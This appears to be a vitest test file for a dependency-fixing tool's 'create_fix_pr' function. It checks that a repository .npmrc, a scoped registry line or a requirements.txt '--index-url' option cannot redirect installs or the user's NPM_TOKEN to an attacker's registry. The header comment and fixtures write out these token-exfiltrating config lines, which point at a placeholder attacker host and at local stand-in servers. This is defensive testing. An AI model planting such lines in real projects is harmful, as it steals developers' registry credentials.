/**
 * `create_fix_pr` must never let a repository's package-manager configuration
 * choose where the user's credentials go (review of 3.0.0, round 2, item 1).
 *
 * The measured route: a repository `.npmrc` with
 *
 *     registry=http://<attacker>/
 *     //<attacker>/:_authToken=${NPM_TOKEN}
 *
 * made the planning tree's `npm outdated` — and every `npm ci`, `npm
 * install` and `npm audit` after it — fetch from the attacker with the
 * user's `NPM_TOKEN`. `--ignore-scripts` does not stop it: it is the fetch. A
 * scoped registry (`@acme:registry=…`) is the same route.
 *
 * Two local HTTP servers stand in for the attacker's registry and the user's
 * own; each records every request's path and `Authorization` header. The
 * user's own `~/.npmrc` (here `NPM_CONFIG_USERCONFIG`) points at theirs with
 * the same `${NPM_TOKEN}`: that token must still reach it, and only it.
 */
import { execFileSync } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { openDatabase } from '../../src/storage/db.js';
import { Storage } from '../../src/storage/index.js';
import { TOOLS } from '../../src/tools/index.js';
import type { Finding } from '../../src/types.js';
import '../../src/registerAll.js';
import { rmDirOrDefer } from '../helpers/tempDir.js';
import { isInstalled } from '../helpers/toolchain.js';

const NPM_INSTALLED = await isInstalled('npm');
const TOKEN = `npm_devguardian_${randomUUID().replace(/-/g, '')}`;
const TIMEOUT_MS = 120_000;

interface Seen {
  url: string;
  authorization: string | undefined;
}

function registry(): Promise<{ server: Server; port: number; seen: Seen[] }> {
  const seen: Seen[] = [];
  const server = createServer((req, res) => {
    seen.push({ url: req.url ?? '', authorization: req.headers.authorization });
    res.writeHead(404, { 'content-type': 'application/json' });
    res.end('{"error":"not found"}');
  });
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address();
      resolve({ server, port: typeof addr === 'object' && addr !== null ? addr.port : 0, seen });
    });
  });
}

let attacker: Awaited<ReturnType<typeof registry>>;
let own: Awaited<ReturnType<typeof registry>>;
let repo: string;
let home: string;

beforeAll(async () => {
  attacker = await registry();
  own = await registry();
});

afterAll(async () => {
  await new Promise((r) => attacker.server.close(r));
  await new Promise((r) => own.server.close(r));
});

beforeEach(() => {
  attacker.seen.length = 0;
  own.seen.length = 0;
  home = mkdtempSync(join(tmpdir(), 'fixpr-reg-home-'));
  const userNpmrc = join(home, '.npmrc');
  writeFileSync(
    userNpmrc,
    `registry=http://127.0.0.1:${own.port}/\n//127.0.0.1:${own.port}/:_authToken=\${NPM_TOKEN}\n`,
  );
  vi.stubEnv('NPM_TOKEN', TOKEN);
  vi.stubEnv('NPM_CONFIG_USERCONFIG', userNpmrc);
  vi.stubEnv('npm_config_cache', join(home, 'npm-cache'));
  repo = mkdtempSync(join(tmpdir(), 'fixpr-reg-'));
  execFileSync('git', ['init', '-q', '-b', 'main', repo]);
  execFileSync('git', ['-C', repo, 'config', 'user.email', 't@example.com']);
  execFileSync('git', ['-C', repo, 'config', 'user.name', 'T']);
});

afterEach(() => {
  vi.unstubAllEnvs();
  rmDirOrDefer(repo);
  rmDirOrDefer(home);
});

function commitProject(files: Record<string, string>): void {
  for (const [name, body] of Object.entries(files)) writeFileSync(join(repo, name), body);
  execFileSync('git', ['-C', repo, 'add', '-A']);
  execFileSync('git', ['-C', repo, 'commit', '-q', '-m', 'project']);
}

function ctx() {
  const { db } = openDatabase({ inMemory: true, projectPath: tmpdir() });
  return { storage: new Storage(db) };
}

/** One open dependency finding from a completed `scan_deps` — enough to make create_fix_pr plan. */
function seedDepsFinding(c: ReturnType<typeof ctx>, pkg: string): void {
  const scanId = randomUUID();
  c.storage.scans.insert({ scan_id: scanId, scan_type: 'deps', project_path: repo, tree_hash: 'deadbeef' });
  const finding: Finding = {
    fingerprint: `fp-${pkg}`,
    tool: 'trivy',
    rule_id: 'CVE-2099-0001',
    severity: 'high',
    category: 'security',
    subcategory: 'cve',
    title: `${pkg}: a vulnerability`,
    file_path: 'package.json',
    snippet: `${pkg}@1.0.0->1.0.1`,
    fix_available: true,
  };
  c.storage.findings.bulkInsert([{ ...finding, scan_id: scanId }]);
  c.storage.scans.finalize({
    scan_id: scanId,
    status: 'completed',
    tools_run: [{ name: 'trivy', status: 'ok' }],
    missing_tools: [],
  });
}

async function runCreateFixPr(c: ReturnType<typeof ctx>): Promise<unknown> {
  const tool = TOOLS.find((t) => t.name === 'create_fix_pr');
  if (tool === undefined) throw new Error('create_fix_pr not registered');
  return tool.handler({ project_path: repo, sources: ['deps'], apply: false }, c as never);
}

const carriesToken = (s: Seen): boolean => s.authorization !== undefined && s.authorization.includes(TOKEN);

interface GroupView {
  key: string;
  outcome: string;
  note: string;
  package_config_set_aside?: string[];
}

function groupsOf(res: unknown): GroupView[] {
  const r = res as { ok: boolean; groups?: GroupView[] };
  expect(r.ok).toBe(true);
  return r.groups ?? [];
}

describe('create_fix_pr — a requirements file that chooses a pip index', () => {
  it(
    'refuses the pip fix, naming the file and the option, and never contacts the index',
    async () => {
      commitProject({
        'requirements.txt': `django==3.2.0\n--index-url http://127.0.0.1:${attacker.port}/simple\n`,
      });
      const c = ctx();
      const scanId = randomUUID();
      c.storage.scans.insert({ scan_id: scanId, scan_type: 'deps', project_path: repo, tree_hash: 'deadbeef' });
      c.storage.findings.bulkInsert([
        {
          fingerprint: 'fp-django',
          tool: 'trivy',
          rule_id: 'CVE-2099-0002',
          severity: 'high',
          category: 'security',
          subcategory: 'cve',
          title: 'django: a vulnerability',
          file_path: 'requirements.txt',
          snippet: 'django@3.2.0->3.2.25',
          fix_available: true,
          scan_id: scanId,
        },
      ]);
      c.storage.cves.upsert({
        cve_id: 'CVE-2099-0002',
        package_name: 'django',
        installed_version: '3.2.0',
        fixed_version: '3.2.25',
        severity: 'high',
        scan_id: scanId,
      });
      c.storage.scans.finalize({ scan_id: scanId, status: 'completed', tools_run: [{ name: 'trivy', status: 'ok' }], missing_tools: [] });

      const groups = groupsOf(await runCreateFixPr(c));

      expect(groups).toHaveLength(1);
      expect(groups[0]?.outcome).toBe('refused');
      // Round 2 (review of 3.0, W2E): the fail-closed allowlist names the line and the host only.
      expect(groups[0]?.note).toBe(
        "refused: the project's Python requirements name where pip installs from, or could not be checked " +
          '(requirements.txt:2: index option (--index-url, http://127.0.0.1)); ' +
          'dev-guardian installs only plain requirements it has read — a name, extras, versions and markers',
      );
      expect(attacker.seen).toEqual([]);
    },
    TIMEOUT_MS,
  );
});

describe('create_fix_pr — what it set aside is named, and put back', () => {
  it.skipIf(!NPM_INSTALLED)(
    "names the repository's .npmrc in the group's result, and leaves the project's own file untouched",
    async () => {
      commitProject({
        'package.json': JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { 'dg-leftpad': '1.0.0' } }),
        'requirements.txt': 'django==3.2.0\n',
        '.npmrc': `registry=http://127.0.0.1:${attacker.port}/\n`,
      });
      const c = ctx();
      const scanId = randomUUID();
      c.storage.scans.insert({ scan_id: scanId, scan_type: 'deps', project_path: repo, tree_hash: 'deadbeef' });
      c.storage.findings.bulkInsert([
        {
          fingerprint: 'fp-django',
          tool: 'trivy',
          rule_id: 'CVE-2099-0003',
          severity: 'high',
          category: 'security',
          subcategory: 'cve',
          title: 'django: a vulnerability',
          file_path: 'requirements.txt',
          snippet: 'django@3.2.0->3.2.25',
          fix_available: true,
          scan_id: scanId,
        },
      ]);
      c.storage.cves.upsert({
        cve_id: 'CVE-2099-0003',
        package_name: 'django',
        installed_version: '3.2.0',
        fixed_version: '3.2.25',
        severity: 'high',
        scan_id: scanId,
      });
      c.storage.scans.finalize({ scan_id: scanId, status: 'completed', tools_run: [{ name: 'trivy', status: 'ok' }], missing_tools: [] });

      const groups = groupsOf(await runCreateFixPr(c));

      expect(groups).toHaveLength(1);
      expect(groups[0]?.package_config_set_aside).toEqual(['.npmrc']);
      expect(attacker.seen).toEqual([]);
      expect(execFileSync('git', ['-C', repo, 'status', '--porcelain'], { encoding: 'utf8' })).toBe('');
    },
    TIMEOUT_MS,
  );
});

describe('create_fix_pr — a repository .npmrc never chooses where the token goes', () => {
  it.skipIf(!NPM_INSTALLED)(
    'a repository registry with ${NPM_TOKEN} gets neither a request nor the token; the user\'s own registry gets the token',
    async () => {
      commitProject({
        'package.json': JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { 'dg-leftpad': '1.0.0' } }),
        '.npmrc': `registry=http://127.0.0.1:${attacker.port}/\n//127.0.0.1:${attacker.port}/:_authToken=\${NPM_TOKEN}\n`,
      });
      const c = ctx();
      seedDepsFinding(c, 'dg-leftpad');

      await runCreateFixPr(c);

      expect(attacker.seen.filter(carriesToken)).toEqual([]);
      expect(attacker.seen).toEqual([]);
      expect(own.seen.some((s) => s.url.includes('dg-leftpad') && carriesToken(s))).toBe(true);
    },
    TIMEOUT_MS,
  );

  it.skipIf(!NPM_INSTALLED)(
    'a scoped registry (@acme:registry) is the same route, and closed the same way',
    async () => {
      commitProject({
        'package.json': JSON.stringify({ name: 'x', version: '1.0.0', dependencies: { '@acme/lib': '1.0.0' } }),
        '.npmrc': `@acme:registry=http://127.0.0.1:${attacker.port}/\n//127.0.0.1:${attacker.port}/:_authToken=\${NPM_TOKEN}\n`,
      });
      const c = ctx();
      seedDepsFinding(c, '@acme/lib');

      await runCreateFixPr(c);

      expect(attacker.seen.filter(carriesToken)).toEqual([]);
      expect(attacker.seen).toEqual([]);
      expect(own.seen.some((s) => s.url.includes('acme') && carriesToken(s))).toBe(true);
    },
    TIMEOUT_MS,
  );
});
